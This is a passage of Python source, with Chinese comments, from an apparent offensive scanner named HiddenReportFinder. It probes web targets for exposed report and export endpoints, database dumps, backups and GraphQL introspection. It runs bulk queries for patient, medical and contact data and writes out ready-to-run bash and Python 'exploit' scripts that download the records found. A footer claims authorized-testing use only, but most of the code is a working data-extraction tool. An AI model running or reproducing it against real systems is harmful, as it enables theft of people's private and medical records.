                        full_path = f"{path}{filename}{ext}"
                        tasks.append(self.check_report_path(session, full_path))
                        
            results = await asyncio.gather(*tasks)
            
            # 收集有效端点
            valid_endpoints = [r for r in results if r is not None]
            self.export_endpoints.extend(valid_endpoints)
            
            print(f"[+] 发现 {len(valid_endpoints)} 个报表端点")

    async def check_report_path(self, session, path):
        """检查报表路径"""
        url = urljoin(self.target_url, path)
        
        try:
            async with session.head(url, timeout=3, allow_redirects=False) as resp:
                if resp.status in [200, 401, 403]:
                    # 获取更多信息
                    content_type = resp.headers.get('Content-Type', '')
                    content_length = resp.headers.get('Content-Length', '0')
                    
                    endpoint_info = {
                        'url': url,
                        'path': path,
                        'status': resp.status,
                        'content_type': content_type,
                        'size': int(content_length)
                    }
                    
                    # 如果是有数据的响应
                    if resp.status == 200 and int(content_length) > 100:
                        print(f"[!] 发现报表: {path}")
                        
                        # 如果是目录列表，获取内容
                        if 'text/html' in content_type:
                            async with session.get(url, timeout=10) as get_resp:
                                content = await get_resp.text()
                                
                                # 检查是否是目录列表或报表页面
                                if any(indicator in content for indicator in ['Index of', 'Directory listing', 'Report', '报表', 'レポート']):
                                    # 提取链接
                                    links = re.findall(r'href=["\']([^"\']+)["\']', content)
                                    report_links = [l for l in links if any(ext in l for ext in ['.csv', '.xlsx', '.json', '.pdf', '.xml'])]
                                    
                                    if report_links:
                                        endpoint_info['report_files'] = report_links[:10]
                                        print(f"    找到报表文件: {len(report_links)} 个")
                                        
                        return endpoint_info
                        
                    elif resp.status in [401, 403]:
                        print(f"[?] 需要认证的报表: {path}")
                        return endpoint_info
                        
        except Exception as e:  # 注意：需要 import logging
                        
            logging.warning(f"异常被忽略: {type(e).__name__}: {str(e)}")
        return None

    async def test_report_parameters(self):
        """测试报表参数"""
        print("\n[+] 测试报表参数...")
        
        if not self.export_endpoints:
            print("[-] 未发现报表端点")
            return
            
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            # 选择最有希望的端点
            test_endpoints = [e for e in self.export_endpoints if e['status'] == 200][:5]
            
            for endpoint in test_endpoints:
                print(f"\n[+] 测试端点: {endpoint['path']}")
                
                # 构造各种参数组合
                param_combinations = []
                
                # 时间范围组合
                param_combinations.append({
                    'date_from': '2020-01-01',
                    'date_to': '2025-6-30',
                    'format': 'json'
                })
                
                param_combinations.append({
                    'start_date': '2020-01-01',
                    'end_date': '2025-6-30',
                    'export': 'true'
                })
                
                # 批量导出
                param_combinations.append({
                    'type': 'all',
                    'limit': '99999',
                    'format': 'csv'
                })
                
                param_combinations.append({
                    'export_all': 'true',
                    'no_limit': 'true'
                })
                
                # 测试每个参数组合
                for params in param_combinations:
                    # 构造URL
                    param_str = '&'.join([f"{k}={v}" for k, v in params.items()])
                    test_url = f"{endpoint['url']}?{param_str}"
                    
                    try:
                        async with session.get(test_url, timeout=15) as resp:
                            if resp.status == 200:
                                content_type = resp.headers.get('Content-Type', '')
                                content_length = int(resp.headers.get('Content-Length', 0))
                                
                                # 检查是否返回了数据
                                if content_length > 1000:  # 大于1KB
                                    print(f"[!] 参数有效: {params}")
                                    
                                    # 下载内容
                                    content = await resp.read()
                                    
                                    # 分析内容
                                    analysis = await self.analyze_report_content(content, content_type, endpoint['path'])
                                    
                                    if analysis['has_data']:
                                        self.found_reports.append({
                                            'endpoint': endpoint['url'],
                                            'params': params,
                                            'content_type': content_type,
                                            'size': content_length,
                                            'analysis': analysis,
                                            'url': test_url
                                        })
                                        
                                        print(f"    [] 包含数据: {analysis['record_count']} 条记录")
                                        
                    except Exception as e:
                        pass

    async def analyze_report_content(self, content, content_type, filename):
        """分析报表内容"""
        analysis = {
            'has_data': False,
            'record_count': 0,
            'data_type': 'unknown',
            'sample_data': None
        }
        
        try:
            # JSON格式
            if 'json' in content_type or filename.endswith('.json'):
                data = json.loads(content)
                
                if isinstance(data, list):
                    analysis['has_data'] = len(data) > 0
                    analysis['record_count'] = len(data)
                    analysis['data_type'] = 'json_array'
                    analysis['sample_data'] = data[:5]
                    
                elif isinstance(data, dict):
                    # 查找数据数组
                    for key in ['data', 'results', 'records', 'items', 'patients', 'appointments']:
                        if key in data and isinstance(data[key], list):
                            analysis['has_data'] = len(data[key]) > 0
                            analysis['record_count'] = len(data[key])
                            analysis['data_type'] = f'json_object.{key}'
                            analysis['sample_data'] = data[key][:5]
                            break
                            
                    # 检查分页信息
                    if 'total' in data:
                        analysis['total_records'] = data['total']
                        
            # CSV格式
            elif 'csv' in content_type or filename.endswith('.csv'):
                text = content.decode('utf-8', errors='ignore')
                lines = text.strip().split('\n')
                
                if len(lines) > 1:  # 至少有标题和一行数据
                    analysis['has_data'] = True
                    analysis['record_count'] = len(lines) - 1  # 减去标题行
                    analysis['data_type'] = 'csv'
                    
                    # 分析字段
                    headers = lines[0].split(',')
                    analysis['fields'] = headers
                    
                    # 检查是否包含敏感字段
                    sensitive_fields = ['name', 'email', 'phone', 'address', 'patient', 'medical']
                    found_sensitive = [h for h in headers if any(s in h.lower() for s in sensitive_fields)]
                    if found_sensitive:
                        analysis['sensitive_fields'] = found_sensitive
                        
            # Excel格式
            elif 'excel' in content_type or 'spreadsheet' in content_type or filename.endswith('.xlsx'):
                # Excel文件通常很大
                if len(content) > 5000:  # 5KB以上
                    analysis['has_data'] = True
                    analysis['data_type'] = 'excel'
                    analysis['file_size'] = len(content)
                    
            # XML格式
            elif 'xml' in content_type or filename.endswith('.xml'):
                text = content.decode('utf-8', errors='ignore')
                
                # 简单计算记录数
                record_tags = re.findall(r'<(patient|record|item|row|entry)[\s>]', text, re.I)
                if record_tags:
                    analysis['has_data'] = True
                    analysis['record_count'] = len(record_tags)
                    analysis['data_type'] = 'xml'
                    
        except Exception as e:
            pass
            
        return analysis

    async def attempt_bulk_export(self):
        """尝试批量导出"""
        print("\n[+] 尝试批量导出...")
        
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            # 构造批量导出URL
            bulk_export_paths = [
                # 直接导出
                '/export/all', '/export/patients', '/export/data',
                '/download/all', '/download/database', '/backup/download',
                
                # API导出
                '/api/export/all', '/api/export?type=all&format=json',
                '/api/v1/export/patients', '/api/bulk-export',
                
                # 带参数的导出
                '/reports/export?all=true&format=csv',
                '/data/export?complete=true&no_limit=true',
                '/admin/export?type=full&download=true',
                
                # SQL导出
                '/phpmyadmin/export.php?db=clinic&table=patients',
                '/adminer.php?export=dump',
                '/db/export.sql', '/database/dump.sql',
                
                # 备份下载
                '/backup/latest', '/backup/full', '/backup/complete',
                '/downloads/backup.zip', '/downloads/data.tar.gz'
            ]
            
            tasks = []
            for path in bulk_export_paths:
                url = urljoin(self.target_url, path)
                tasks.append(self.check_bulk_export(session, url))
                
            results = await asyncio.gather(*tasks)
            
            # 收集成功的导出
            successful_exports = [r for r in results if r is not None]
            
            if successful_exports:
                print(f"[!] 发现 {len(successful_exports)} 个批量导出!")
                self.found_reports.extend(successful_exports)

    async def check_bulk_export(self, session, url):
        """检查批量导出"""
        try:
            async with session.head(url, timeout=3, allow_redirects=True) as resp:
                if resp.status == 200:
                    content_type = resp.headers.get('Content-Type', '')
                    content_length = int(resp.headers.get('Content-Length', 0))
                    
                    # 检查是否是大文件
                    if content_length > 10000:  # 10KB以上
                        print(f"[!] 发现批量导出: {url}")
                        print(f"    大小: {self.format_size(content_length)}")
                        print(f"    类型: {content_type}")
                        
                        return {
                            'endpoint': url,
                            'type': 'bulk_export',
                            'content_type': content_type,
                            'size': content_length,
                            'url': url
                        }
                        
        except Exception as e:  # 注意：需要 import logging
                        
            logging.warning(f"异常被忽略: {type(e).__name__}: {str(e)}")
        return None

    async def detect_graphql(self):
        """探测GraphQL端点"""
        print("\n[+] 探测GraphQL...")
        
        graphql_paths = [
            '/graphql', '/graphql/', '/api/graphql', '/v1/graphql',
            '/graphiql', '/playground', '/api/playground',
            '/_graphql', '/query', '/api/query'
        ]
        
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            for path in graphql_paths:
                url = urljoin(self.target_url, path)
                
                # 测试introspection查询
                introspection_query = {
                    "query": """
                    {
                        __schema {
                            types {
                                name
                                fields {
                                    name
                                    type {
                                        name
                                    }
                                }
                            }
                        }
                    }
                    """
                }
                
                try:
                    async with session.post(
                        url, 
                        json=introspection_query,
                        headers={'Content-Type': 'application/json'},
                        timeout=10
                    ) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            
                            if 'data' in data and '__schema' in data['data']:
                                print(f"[!] 发现GraphQL端点: {url}")
                                
                                # 分析schema
                                types = data['data']['__schema']['types']
                                
                                # 查找数据类型
                                data_types = []
                                for type_def in types:
                                    type_name = type_def['name'].lower()
                                    if any(keyword in type_name for keyword in ['patient', 'user', 'appointment', 'medical', 'record']):
                                        data_types.append(type_def['name'])
                                        
                                if data_types:
                                    print(f"    发现数据类型: {', '.join(data_types)}")
                                    
                                    # 构造批量查询
                                    await self.exploit_graphql_bulk(session, url, data_types)
                                    
                                self.found_reports.append({
                                    'endpoint': url,
                                    'type': 'graphql',
                                    'schema_types': len(types),
                                    'data_types': data_types
                                })
                                
                except Exception as e:  # 注意：需要 import logging
                                
                    logging.warning(f"异常被忽略: {type(e).__name__}: {str(e)}")
    async def exploit_graphql_bulk(self, session, url, data_types):
        """利用GraphQL批量查询"""
        print("[+] 尝试GraphQL批量查询...")
        
        # 构造批量查询
        for type_name in data_types[:3]:  # 限制数量，避免过度扫描
            # 猜测查询名称
            query_names = [
                type_name.lower() + 's',  # patients
                'all' + type_name + 's',  # allPatients
                'get' + type_name + 's',  # getPatients
                type_name.lower() + 'List',  # patientList
            ]
            
            for query_name in query_names:
                bulk_query = {
                    "query": f"""
                    {{
                        {query_name}(first: 10000) {{
                            id
                            name
                            email
                            phone
                            createdAt
                        }}
                    }}
                    """
                }
                
                try:
                    async with session.post(
                        url,
                        json=bulk_query,
                        headers={'Content-Type': 'application/json'},
                        timeout=30
                    ) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            
                            if 'data' in data and query_name in data['data']:
                                results = data['data'][query_name]
                                if results and len(results) > 0:
                                    print(f"[!] GraphQL批量查询成功: {query_name}")
                                    print(f"    获取 {len(results)} 条记录")
                                    
                                    self.extracted_data.append({
                                        'source': 'graphql',
                                        'query': query_name,
                                        'count': len(results),
                                        'sample': results[:5]
                                    })
                                    
                except Exception as e:  # 注意：需要 import logging
                                    
                    logging.warning(f"异常被忽略: {type(e).__name__}: {str(e)}")
    def format_size(self, size):
        """格式化文件大小"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024.0:
                return f"{size:.2f} {unit}"
            size /= 1024.0
        return f"{size:.2f} TB"

    def generate_smart_report(self):
        """生成智能化报告 - 包含价值评估和POC"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # 综合分析和价值评估
        analysis = self._analyze_scan_results()
        
        # 生成详细报告
        report = {
            'meta': {
                'target': self.target_url,
                'scan_time': datetime.now().isoformat(),
                'scanner_version': 'HiddenReportFinder v2.0 (Enhanced)',
                'scan_id': f"HRF_{timestamp}",
                'noise_filter_enabled': NOISE_FILTER_AVAILABLE
            },
            
            # 技术栈信息
            'technology_stack': self.detected_tech_stack,
            
            # BI系统发现
            'bi_systems': {
                'total_found': len(self.bi_systems),
                'systems': self.bi_systems,
                'high_confidence': [bi for bi in self.bi_systems if bi.get('confidence', 0) > 70],
                'with_default_creds': [bi for bi in self.bi_systems if bi.get('default_creds_found', False)]
            },
            
            # 报表端点发现
            'report_endpoints': {
                'total_found': len(self.export_endpoints),
                'high_value': [ep for ep in self.export_endpoints if ep.get('value_score', 0) > 70],
                'accessible': [ep for ep in self.export_endpoints if ep.get('status') == 200],
                'auth_required': [ep for ep in self.export_endpoints if ep.get('status') in [401, 403]],
                'by_discovery_method': self._group_by_discovery_method()
            },
            
            # 成功的报表获取
            'successful_reports': {
                'total_found': len(self.found_reports),
                'by_sensitive_level': self._group_by_sensitive_level(),
                'high_value_reports': [r for r in self.found_reports if r.get('analysis', {}).get('data_value_score', 0) > 80],
                'with_sensitive_data': [r for r in self.found_reports if r.get('analysis', {}).get('has_sensitive_data', False)]
            },
            
            # 数据泄露分析
            'data_exposure_analysis': analysis['data_exposure'],
            
            # 安全风险评估
            'security_assessment': analysis['security_risks'],
            
            # 噪音过滤统计
            'noise_filtering_stats': self.noise_stats,
            
            # WAF防护统计
            'waf_protection_stats': {
                'waf_defender_enabled': WAF_DEFENDER_AVAILABLE,
                'waf_defender_initialized': self.waf_defender_initialized,
                'target_url': self.target_url,
                'protection_status': '已启用WAF欺骗检测' if self.waf_defender_initialized else 
                                   ('WAF Defender不可用' if not WAF_DEFENDER_AVAILABLE else '未初始化'),
                'baseline_info': self.waf_defender.get_stats() if self.waf_defender else None
            },
            
            # 攻击面评估
            'attack_surface': analysis['attack_surface'],
            
            # 建议和下一步
            'recommendations': analysis['recommendations']
        }
        
        # 保存JSON报告
        report_file = f"hidden_report_finder_smart_{timestamp}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2, default=str)
        
        # 生成利用脚本
        self._generate_exploitation_scripts(timestamp, analysis)
        
        # 生成HTML报告
        self._generate_html_report(timestamp, report, analysis)
        
        # 生成Burp Suite配置
        self._generate_burp_config(timestamp)
        
        # 打印摘要
        self._print_smart_summary(report, analysis)
        
        print(f"\n 智能化报告生成完成!")
        print(f"📄 详细报告: {report_file}")
        
        return report

    def _analyze_scan_results(self):
        """分析扫描结果"""
        analysis = {
            'data_exposure': {
                'severity': 'low',
                'total_records_exposed': 0,
                'sensitive_data_types': [],
                'exposure_methods': []
            },
            'security_risks': {
                'overall_risk': 'low',
                'critical_issues': [],
                'high_issues': [],
                'medium_issues': []
            },
            'attack_surface': {
                'entry_points': len(self.export_endpoints),
                'bi_systems': len(self.bi_systems),
                'bypass_successful': len([r for r in self.found_reports if r.get('bypass_type')]),
                'hidden_paths': len([ep for ep in self.export_endpoints if ep.get('discovered_method') == 'hidden_path_discovery'])
            },
            'recommendations': []
        }
        
        # 数据暴露分析
        total_records = 0
        sensitive_types = set()
        
        for report in self.found_reports:
            if 'analysis' in report:
                record_count = report['analysis'].get('record_count', 0)
                if isinstance(record_count, int):
                    total_records += record_count
                
                if report['analysis'].get('has_sensitive_data'):
                    sensitive_fields = report['analysis'].get('sensitive_fields', [])
                    sensitive_types.update(sensitive_fields)
        
        analysis['data_exposure']['total_records_exposed'] = total_records
        analysis['data_exposure']['sensitive_data_types'] = list(sensitive_types)
        
        # 严重程度评估
        if total_records > 10000 or len(sensitive_types) > 5:
            analysis['data_exposure']['severity'] = 'critical'
        elif total_records > 1000 or len(sensitive_types) > 2:
            analysis['data_exposure']['severity'] = 'high'
        elif total_records > 100 or len(sensitive_types) > 0:
            analysis['data_exposure']['severity'] = 'medium'
        
        # 安全风险评估
        critical_issues = []
        high_issues = []
        medium_issues = []
        
        # 检查关键问题
        if any(r.get('analysis', {}).get('sensitive_level') == 'high' for r in self.found_reports):
            critical_issues.append("发现高敏感度数据暴露")
        
        if len([bi for bi in self.bi_systems if bi.get('default_creds_found', False)]) > 0:
            critical_issues.append("BI系统存在默认凭据")
        
        # 检查高风险问题
        if len([ep for ep in self.export_endpoints if ep.get('status') == 200]) > 5:
            high_issues.append("大量报表端点可直接访问")
        
        if len([r for r in self.found_reports if r.get('bypass_type')]) > 0:
            high_issues.append("存在权限绕过漏洞")
        
        # 检查中等风险问题
        if len(self.bi_systems) > 0:
            medium_issues.append("检测到BI系统，需进一步评估")
        
        if len([ep for ep in self.export_endpoints if ep.get('status') in [401, 403]]) > 3:
            medium_issues.append("多个端点需要认证，可能存在绕过机会")
        
        analysis['security_risks']['critical_issues'] = critical_issues
        analysis['security_risks']['high_issues'] = high_issues  
        analysis['security_risks']['medium_issues'] = medium_issues
        
        # 总体风险评估
        if critical_issues:
            analysis['security_risks']['overall_risk'] = 'critical'
        elif high_issues:
            analysis['security_risks']['overall_risk'] = 'high'
        elif medium_issues:
            analysis['security_risks']['overall_risk'] = 'medium'
        
        # 生成建议
        recommendations = []
        
        if analysis['data_exposure']['severity'] in ['critical', 'high']:
            recommendations.append("🚨 立即限制报表端点访问权限")
            recommendations.append(" 实施强身份认证和授权机制")
        
        if len(self.bi_systems) > 0:
            recommendations.append(" 审查BI系统配置和权限设置")
            recommendations.append(" 更改所有默认凭据")
        
        if len([r for r in self.found_reports if r.get('bypass_type')]) > 0:
            recommendations.append(" 修复权限绕过漏洞")
            recommendations.append(" 进行安全代码审计")
        
        recommendations.extend([
            " 定期进行报表系统安全扫描",
            " 实施数据泄漏防护(DLP)解决方案",
            " 建立数据访问日志和监控"
        ])
        
        analysis['recommendations'] = recommendations
        
        return analysis

    def _group_by_discovery_method(self):
        """按发现方法分组"""
        groups = {}
        for ep in self.export_endpoints:
            method = ep.get('discovered_method', 'unknown')
            if method not in groups:
                groups[method] = []
            groups[method].append(ep)
        return groups

    def _group_by_sensitive_level(self):
        """按敏感度级别分组"""
        groups = {'critical': [], 'high': [], 'medium': [], 'low': []}
        for report in self.found_reports:
            level = report.get('sensitive_level', 'low')
            if level in groups:
                groups[level].append(report)
        return groups

    def _generate_exploitation_scripts(self, timestamp, analysis):
        """生成利用脚本"""
        if not self.found_reports:
            return
            
        # Bash下载脚本
        script_file = f"exploit_reports_{timestamp}.sh"
        with open(script_file, 'w') as f:
            f.write("#!/bin/bash\n")
            f.write(f"# 智能化报表利用脚本\n")
            f.write(f"# 目标: {self.target_url}\n")
            f.write(f"# 生成时间: {datetime.now()}\n")
            f.write(f"# 风险等级: {analysis['security_risks']['overall_risk']}\n\n")
            
            f.write("# 创建目录结构\n")
            f.write("mkdir -p exploit_results/{sensitive_data,bi_systems,bypass_techniques}\n\n")
            
            # 分类下载
            for i, report in enumerate(self.found_reports):
                url = report.get('url', report.get('endpoint', ''))
                method = report.get('method', 'GET')
                headers = report.get('headers', {})
                
                # 确定文件类型和目录
                content_type = report.get('content_type', '')
                sensitive_level = report.get('sensitive_level', 'low')
                
                if sensitive_level in ['critical', 'high']:
                    directory = "exploit_results/sensitive_data"
                elif report.get('bypass_type'):
                    directory = "exploit_results/bypass_techniques"
                else:
                    directory = "exploit_results/bi_systems"
                
                # 确定文件扩展名
                if 'json' in content_type:
                    ext = '.json'
                elif 'csv' in content_type:
                    ext = '.csv'
                elif 'excel' in content_type:
                    ext = '.xlsx'
                elif 'xml' in content_type:
                    ext = '.xml'
                else:
                    ext = '.data'
                
                f.write(f"# 报表 {i+1} - {sensitive_level} 敏感度\n")
                f.write(f"echo '下载报表 {i+1}: {url[:50]}...'\n")
                
                # 构造curl命令
                curl_cmd = f"curl -X {method}"
                if headers:
                    for key, value in headers.items():
                        curl_cmd += f" -H '{key}: {value}'"
                
                curl_cmd += f" -o '{directory}/report_{i+1}_{sensitive_level}{ext}' '{url}'"
                f.write(f"{curl_cmd}\n\n")
            
            f.write("echo ' 所有报表下载完成!'\n")
            f.write("echo ' 统计信息:'\n")
            f.write("find exploit_results/ -type f -exec ls -lh {} + | awk '{print $5, $9}'\n")
        
        import os
        os.chmod(script_file, 0o755)
        
        # Python自动化脚本
        py_script_file = f"exploit_automation_{timestamp}.py"
        with open(py_script_file, 'w') as f:
            f.write(f"""#!/usr/bin/env python3
# 智能化报表自动利用脚本
# 生成时间: {datetime.now()}

import asyncio
import aiohttp
import json
import os
from datetime import datetime

class ReportExploiter:
    def __init__(self):
        self.target_url = "{self.target_url}"
        self.results = []
        
    async def exploit_all_reports(self):
        print(" 开始自动化报表利用...")
        
        # 高价值报表列表
        high_value_reports = {json.dumps([r for r in self.found_reports if r.get('analysis', {}).get('data_value_score', 0) > 70], indent=2)}
        
        async with aiohttp.ClientSession() as session:
            for report in high_value_reports:
                await self._exploit_single_report(session, report)
        
        await self._generate_analysis_report()
    
    async def _exploit_single_report(self, session, report):
        url = report.get('url', '')
        method = report.get('method', 'GET')
        headers = report.get('headers', {{}})
        
        try:
            async with session.request(method, url, headers=headers) as resp:
                if resp.status == 200:
                    content = await resp.read()
                    await self._analyze_and_save(report, content)
                    print(f" 成功利用: {{url[:50]}}...")
        except Exception as e:
            print(f" 利用失败: {{e}}")
    
    async def _analyze_and_save(self, report, content):
        # 这里可以添加更多的数据分析逻辑
        analysis = report.get('analysis', {{}})
        
        # 保存数据
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"exploited_data_{{timestamp}}.json"
        
        with open(filename, 'w') as f:
            json.dump({{
                'report_info': report,
                'data_size': len(content),
                'timestamp': timestamp
            }}, f, indent=2)
    
    async def _generate_analysis_report(self):
        print(" 生成分析报告...")
        # 分析逻辑...

if __name__ == "__main__":
    exploiter = ReportExploiter()
    asyncio.run(exploiter.exploit_all_reports())
""")
        
        os.chmod(py_script_file, 0o755)
        
        print(f" 利用脚本: {script_file}")
        print(f" 自动化脚本: {py_script_file}")

    def _generate_html_report(self, timestamp, report, analysis):
        """生成HTML可视化报告"""
        html_file = f"smart_report_{timestamp}.html"
        
        with open(html_file, 'w', encoding='utf-8') as f:
            f.write(f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>智能化隐藏报表发现报告</title>
    <style>
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px 10px 0 0; }}
        .header h1 {{ margin: 0; font-size: 2.5em; }}
        .header .meta {{ opacity: 0.9; margin-top: 10px; }}
        .content {{ padding: 30px; }}
        .section {{ margin-bottom: 40px; }}
        .section h2 {{ color: #333; border-bottom: 3px solid #667eea; padding-bottom: 10px; }}
        .stats-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin: 20px 0; }}
        .stat-card {{ background: #f8f9fa; padding: 20px; border-radius: 8px; border-left: 4px solid #667eea; }}
        .stat-number {{ font-size: 2em; font-weight: bold; color: #667eea; }}
        .risk-critical {{ border-left-color: #dc3545; color: #dc3545; }}
        .risk-high {{ border-left-color: #fd7e14; color: #fd7e14; }}
        .risk-medium {{ border-left-color: #ffc107; color: #ffc107; }}
        .risk-low {{ border-left-color: #28a745; color: #28a745; }}
        .table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        .table th, .table td {{ border: 1px solid #dee2e6; padding: 12px; text-align: left; }}
        .table th {{ background: #f8f9fa; font-weight: 600; }}
        .badge {{ padding: 4px 8px; border-radius: 4px; font-size: 0.8em; font-weight: bold; }}
        .badge-critical {{ background: #dc3545; color: white; }}
        .badge-high {{ background: #fd7e14; color: white; }}
        .badge-medium {{ background: #ffc107; color: black; }}
        .badge-low {{ background: #28a745; color: white; }}
        .recommendations {{ background: #e7f3ff; padding: 20px; border-radius: 8px; border: 1px solid #b3d9ff; }}
        .recommendations ul {{ margin: 0; padding-left: 20px; }}
        .recommendations li {{ margin: 10px 0; }}
        .code-block {{ background: #f8f9fa; padding: 15px; border-radius: 5px; font-family: monospace; overflow-x: auto; }}
        .footer {{ text-align: center; padding: 20px; color: #666; border-top: 1px solid #dee2e6; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1> 智能化隐藏报表发现报告</h1>
            <div class="meta">
                <p>目标: {self.target_url}</p>
                <p>扫描时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                <p>扫描器版本: HiddenReportFinder v2.0 (Enhanced)</p>
                <p>噪音过滤: {' 启用' if NOISE_FILTER_AVAILABLE else ' 禁用'}</p>
            </div>
        </div>
        
        <div class="content">
            <!-- 概览统计 -->
            <div class="section">
                <h2> 扫描概览</h2>
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-number">{len(self.found_reports)}</div>
                        <div>成功获取的报表</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{len(self.export_endpoints)}</div>
                        <div>发现的报表端点</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{len(self.bi_systems)}</div>
                        <div>检测到的BI系统</div>
                    </div>
                    <div class="stat-card risk-{analysis['security_risks']['overall_risk']}">
                        <div class="stat-number">{analysis['security_risks']['overall_risk'].upper()}</div>
                        <div>整体风险等级</div>
                    </div>
                </div>
            </div>
            
            <!-- 数据暴露分析 -->
            <div class="section">
                <h2>🚨 数据暴露分析</h2>
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-number">{analysis['data_exposure']['total_records_exposed']:,}</div>
                        <div>暴露的数据记录数</div>
                    </div>
                    <div class="stat-card risk-{analysis['data_exposure']['severity']}">
                        <div class="stat-number">{analysis['data_exposure']['severity'].upper()}</div>
                        <div>数据暴露严重程度</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{len(analysis['data_exposure']['sensitive_data_types'])}</div>
                        <div>敏感数据类型</div>
                    </div>
                </div>
                
                <h3>敏感数据类型详情:</h3>
                <div class="code-block">
                    {', '.join(analysis['data_exposure']['sensitive_data_types']) or '无敏感数据检测'}
                </div>
            </div>
            
            <!-- BI系统发现 -->
            <div class="section">
                <h2> BI系统发现</h2>
                <table class="table">
                    <thead>
                        <tr>
                            <th>系统名称</th>
                            <th>URL</th>
                            <th>状态</th>
                            <th>置信度</th>
                            <th>版本</th>
                            <th>需要认证</th>
                        </tr>
                    </thead>
                    <tbody>""")
            
            for bi in self.bi_systems:
                confidence_class = 'high' if bi.get('confidence', 0) > 70 else 'medium' if bi.get('confidence', 0) > 40 else 'low'
                f.write(f"""
                        <tr>
                            <td>{bi.get('name', 'Unknown')}</td>
                            <td><a href="{bi.get('url', '')}" target="_blank">{bi.get('url', '')[:50]}...</a></td>
                            <td><span class="badge badge-{confidence_class}">{bi.get('status', 'Unknown')}</span></td>
                            <td>{bi.get('confidence', 0)}%</td>
                            <td>{bi.get('version', 'Unknown')}</td>
                            <td>{'是' if bi.get('auth_required', False) else '否'}</td>
                        </tr>""")
            
            f.write(f"""
                    </tbody>
                </table>
            </div>
            
            <!-- 高价值报表 -->
            <div class="section">
                <h2> 高价值报表发现</h2>
                <table class="table">
                    <thead>
                        <tr>
                            <th>报表URL</th>
                            <th>敏感度</th>
                            <th>数据大小</th>
                            <th>记录数</th>
                            <th>发现方法</th>
                            <th>操作</th>
                        </tr>
                    </thead>
                    <tbody>""")
            
            high_value_reports = [r for r in self.found_reports if r.get('analysis', {}).get('data_value_score', 0) > 70]
            for report in high_value_reports[:10]:  # 只显示前10个
                sensitive_level = report.get('sensitive_level', 'low')
                size = self.format_size(report.get('size', 0))
                record_count = report.get('analysis', {}).get('record_count', 'Unknown')
                discovery_method = report.get('discovery_method', 'Unknown')
                url = report.get('url', report.get('endpoint', ''))
                
                f.write(f"""
                        <tr>
                            <td><a href="{url}" target="_blank">{url[:60]}...</a></td>
                            <td><span class="badge badge-{sensitive_level}">{sensitive_level.upper()}</span></td>
                            <td>{size}</td>
                            <td>{record_count}</td>
                            <td>{discovery_method}</td>
                            <td><button onclick="window.open('{url}')">访问</button></td>
                        </tr>""")
            
            f.write(f"""
                    </tbody>
                </table>
            </div>
            
            <!-- 安全建议 -->
            <div class="section">
                <h2> 安全建议</h2>
                <div class="recommendations">
                    <h3>立即行动建议:</h3>
                    <ul>""")
            
            for recommendation in analysis['recommendations']:
                f.write(f"<li>{recommendation}</li>")
            
            f.write(f"""
                    </ul>
                </div>
            </div>
            
            <!-- 噪音过滤统计 -->
            <div class="section">
                <h2> 噪音过滤效果</h2>
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-number">{self.noise_stats['total_paths_tested']}</div>
                        <div>总测试路径数</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{self.noise_stats['noise_filtered']}</div>
                        <div>过滤的噪音数</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{self.noise_stats['valuable_findings']}</div>
                        <div>有价值发现数</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{(self.noise_stats['noise_filtered'] / max(1, self.noise_stats['total_paths_tested']) * 100):.1f}%</div>
                        <div>噪音过滤率</div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p>Generated by HiddenReportFinder v2.0 (Enhanced) - 智能化BI与报表系统安全扫描器</p>
            <p> 本报告仅用于授权的安全测试目的</p>
        </div>
    </div>
    
    <script>
        // 添加一些交互功能
        document.addEventListener('DOMContentLoaded', function() {{
            console.log(' Hidden Report Finder - Smart Report Loaded');
        }});
    </script>
</body>
</html>""")
        
        print(f" HTML报告: {html_file}")

    def _generate_burp_config(self, timestamp):
        """生成Burp Suite配置文件"""
        if not self.found_reports:
            return
            
        config_file = f"burp_config_{timestamp}.json"
        
        # 构造Burp配置
        burp_config = {
            "target": {
                "scope": {
                    "advanced_mode": True,
                    "exclude": [],
                    "include": [{
                        "enabled": True,
                        "file": ".*",
                        "host": urlparse(self.target_url).netloc,
                        "port": "443" if self.target_url.startswith('https') else "80",
                        "protocol": "https" if self.target_url.startswith('https') else "http"
                    }]
                }
            },
            "scanner": {
                "live_scanning": {
                    "url_scope": "target_scope"
                }
            },
            "intruder": {
                "payloads": []
            }
        }
        
        # 添加发现的端点作为intruder目标
        payloads = []
        for report in self.found_reports:
